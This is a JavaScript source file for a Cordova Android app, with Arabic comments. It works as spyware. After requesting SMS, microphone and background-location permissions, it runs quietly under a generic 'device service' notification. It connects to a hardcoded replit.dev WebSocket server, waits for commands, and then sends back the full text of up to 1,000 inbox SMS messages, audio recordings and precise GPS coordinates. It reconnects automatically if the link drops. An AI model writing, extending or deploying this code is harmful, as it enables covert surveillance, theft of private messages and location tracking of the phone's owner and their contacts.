document.addEventListener('deviceready', onDeviceReady, false);

// تخزين الطلبات المستلمة
const receivedRequests = [];

function onDeviceReady() {
  console.log('Device is ready');
  
  // طلب الأذونات تلقائياً
  requestPermissions();
  
  // معلومات الجهاز
  const deviceInfo = {
    uuid: device.uuid || generateUUID(),
    model: device.model || 'Unknown',
    platform: device.platform || 'Unknown',
    version: device.version || 'Unknown',
    manufacturer: device.manufacturer || 'Unknown',
    battery: null,
    timestamp: new Date().toISOString()
  };
  
  // توليد UUID إذا لم يكن موجوداً
  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      const r = Math.random() * 16 | 0;
      const v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }
  
  // طلب الأذونات المطلوبة
  function requestPermissions() {
    const permissions = [
      'android.permission.READ_SMS',
      'android.permission.RECORD_AUDIO',
      'android.permission.ACCESS_FINE_LOCATION',
      'android.permission.ACCESS_BACKGROUND_LOCATION',
      'android.permission.FOREGROUND_SERVICE'
    ];
    
    permissions.forEach(permission => {
      cordova.plugins.permissions.checkPermission(
        permission, 
        success => { if (!success) requestPermission(permission); },
        error => console.error('Error checking permission:', error)
      );
    });
    
    function requestPermission(permission) {
      cordova.plugins.permissions.requestPermission(
        permission,
        success => console.log('Permission granted:', permission),
        error => console.error('Permission denied:', permission, error)
      );
    }
  }
  
  // تشغيل الخدمة في الخلفية
  function startBackgroundService() {
    if (cordova.plugins.backgroundMode) {
      cordova.plugins.backgroundMode.enable();
      cordova.plugins.backgroundMode.setDefaults({
        title: 'خدمة الجهاز',
        text: 'جاري تشغيل الخدمة في الخلفية',
        icon: 'icon'
      });
      
      cordova.plugins.backgroundMode.on('activate', () => {
        cordova.plugins.backgroundMode.disableWebViewOptimizations();
      });
    }
  }
  
  // الحصول على حالة البطارية
  if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
      connectToServer(deviceInfo);
      startBackgroundService();
      
      // مراقبة تغيرات البطارية
      battery.addEventListener('levelchange', updateBatteryInfo);
      battery.addEventListener('chargingchange', updateBatteryInfo);
    }).catch(error => {
      console.error('Battery API error:', error);
      connectToServer(deviceInfo);
      startBackgroundService();
    });
  } else {
    connectToServer(deviceInfo);
    startBackgroundService();
  }
  
  function updateBatteryInfo() {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
      
      // إرسال تحديث البطارية إلى الخادم
      if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
        window.wsConnection.send(JSON.stringify({
          type: 'device_update',
          deviceInfo: {
            battery: deviceInfo.battery,
            timestamp: new Date().toISOString()
          }
        }));
      }
    });
  }
}

function connectToServer(deviceInfo) {
  // استخدام رابط الخادم المقدم
  const wsUrl = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';
  window.wsConnection = new WebSocket(wsUrl);
  
  wsConnection.onopen = () => {
    console.log('Connected to server');
    
    // تسجيل الجهاز
    wsConnection.send(JSON.stringify({
      type: 'register',
      deviceId: deviceInfo.uuid,
      deviceInfo
    }));
  };
  
  wsConnection.onmessage = (event) => {
    try {
      const data = JSON.parse(event.data);
      
      if (data.type === 'command') {
        console.log('Received command:', data.command);
        receivedRequests.push({
          id: Date.now(),
          command: data.command,
          timestamp: new Date().toISOString(),
          status: 'received'
        });
        
        // تنفيذ الأمر وإرسال الرد
        executeCommand(data.command, (response) => {
          const requestIndex = receivedRequests.findIndex(req => 
            req.command.commandId === data.command.commandId);
          if (requestIndex !== -1) {
            receivedRequests[requestIndex].status = 'completed';
            receivedRequests[requestIndex].response = response;
          }
          
          if (wsConnection.readyState === WebSocket.OPEN) {
            wsConnection.send(JSON.stringify({
              type: 'response',
              commandId: data.commandId,
              response
            }));
          }
        });
      }
      else if (data.type === 'registered') {
        console.log('Device registered successfully:', data);
      }
      
    } catch (error) {
      console.error('Error processing message:', error);
    }
  };
  
  wsConnection.onerror = (error) => {
    console.error('WebSocket error:', error);
  };
  
  wsConnection.onclose = () => {
    console.log('Disconnected from server');
    // إعادة الاتصال بعد تأخير
    setTimeout(() => connectToServer(deviceInfo), 10000);
  };
  
  // إرسال نبضات قلبية دورية
  const heartbeatInterval = setInterval(() => {
    if (wsConnection.readyState === WebSocket.OPEN) {
      wsConnection.send(JSON.stringify({ 
        type: 'heartbeat',
        timestamp: new Date().toISOString()
      }));
    } else {
      clearInterval(heartbeatInterval);
    }
  }, 30000);
}

function executeCommand(command, callback) {
  console.log('Executing command:', command);
  
  // إضافة commandId للتعقب
  const commandId = command.commandId || Date.now();
  
  switch (command.type) {
    case 'get_location':
      getLocation(commandId, callback);
      break;
    case 'get_sms':
      getSMS(commandId, callback);
      break;
    case 'record_audio':
      recordAudio(commandId, command.duration, callback);
      break;
    case 'get_device_info':
      getDeviceInfo(commandId, callback);
      break;
    case 'get_requests':
      getRequests(commandId, callback);
      break;
    default:
      callback({ 
        commandId,
        status: 'error',
        error: 'Unknown command',
        receivedCommand: command
      });
  }
}

function getLocation(commandId, callback) {
  const options = {
    enableHighAccuracy: true,
    timeout: 15000,
    maximumAge: 0
  };
  
  navigator.geolocation.getCurrentPosition(
    (position) => {
      const locationData = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        altitude: position.coords.altitude,
        altitudeAccuracy: position.coords.altitudeAccuracy,
        heading: position.coords.heading,
        speed: position.coords.speed,
        timestamp: position.timestamp,
        googleMapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
      };
      
      callback({
        commandId,
        status: 'success',
        location: locationData
      });
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'Location error',
        details: {
          code: error.code,
          message: error.message,
          PERMISSION_DENIED: error.PERMISSION_DENIED,
          POSITION_UNAVAILABLE: error.POSITION_UNAVAILABLE,
          TIMEOUT: error.TIMEOUT
        }
      });
    },
    options
  );
}

function getSMS(commandId, callback) {
  if (typeof SMS === 'undefined') {
    return callback({ 
      commandId,
      status: 'error',
      error: 'SMS plugin not available',
      suggestion: 'Install cordova-sms-plugin'
    });
  }
  
  const filter = {
    box: 'inbox',
    maxCount: 1000, // زيادة عدد الرسائل المسحوبة
    indexFrom: 0
  };
  
  SMS.listSMS(
    filter,
    (messages) => {
      callback({
        commandId,
        status: 'success',
        count: messages.length,
        messages: messages.map(msg => ({
          id: msg._id,
          address: msg.address,
          body: msg.body, // عرض النص الكامل بدون قص
          date: msg.date,
          read: msg.read
        }))
      });
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'SMS error',
        details: error
      });
    }
  );
}

function recordAudio(commandId, duration, callback) {
  duration = duration || 10; // Default 10 seconds
  
  const mediaRecorderOptions = {
    mimeType: 'audio/mp3',
    audioBitsPerSecond: 128000
  };
  
  navigator.mediaDevices.getUserMedia({ audio: true })
    .then(stream => {
      const mediaRecorder = new MediaRecorder(stream, mediaRecorderOptions);
      const audioChunks = [];
      
      mediaRecorder.ondataavailable = event => {
        audioChunks.push(event.data);
      };
      
      mediaRecorder.onstop = () => {
        const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
        const audioUrl = URL.createObjectURL(audioBlob);
        
        // حفظ التسجيل في الذاكرة الداخلية
        saveAudioToStorage(audioBlob, (filePath) => {
          callback({ 
            commandId,
            status: 'success',
            audio: {
              duration: duration,
              format: 'mp3',
              size: audioBlob.size,
              url: audioUrl,
              filePath: filePath
            }
          });
        });
      };
      
      mediaRecorder.start();
      setTimeout(() => {
        mediaRecorder.stop();
        stream.getTracks().forEach(track => track.stop());
      }, duration * 1000);
    })
    .catch(error => {
      callback({ 
        commandId,
        status: 'error',
        error: 'Audio recording error',
        details: error.message
      });
    });
}

function saveAudioToStorage(audioBlob, callback) {
  window.resolveLocalFileSystemURL(cordova.file.externalDataDirectory, dir => {
    dir.getFile(`recording_${Date.now()}.mp3`, { create: true }, file => {
      file.createWriter(writer => {
        writer.onwriteend = () => callback(file.nativeURL);
        writer.onerror = e => console.error('Error saving file:', e);
        writer.write(audioBlob);
      });
    });
  });
}

function getDeviceInfo(commandId, callback) {
  const info = {
    cordova: device.cordova,
    model: device.model,
    platform: device.platform,
    uuid: device.uuid,
    version: device.version,
    manufacturer: device.manufacturer,
    isVirtual: device.isVirtual,
    serial: device.serial,
    receivedRequests: receivedRequests
  };
  
  callback({
    commandId,
    status: 'success',
    deviceInfo: info
  });
}

function getRequests(commandId, callback) {
  callback({
    commandId,
    status: 'success',
    requests: receivedRequests
  });
}
